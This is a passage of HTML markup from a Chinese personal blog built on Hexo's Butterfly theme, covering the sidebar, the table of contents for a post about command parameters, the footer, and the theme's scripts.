"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sql注入-pikachu</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/head1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">haha</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">78</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">36</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w00123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">放假!快快放假！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">命令参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">安全参数</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By haha</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/weibo.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
 POWERMODE.shake = false;
 POWERMODE.mobile = false;
 document.body.addEventListener('input', POWERMODE);
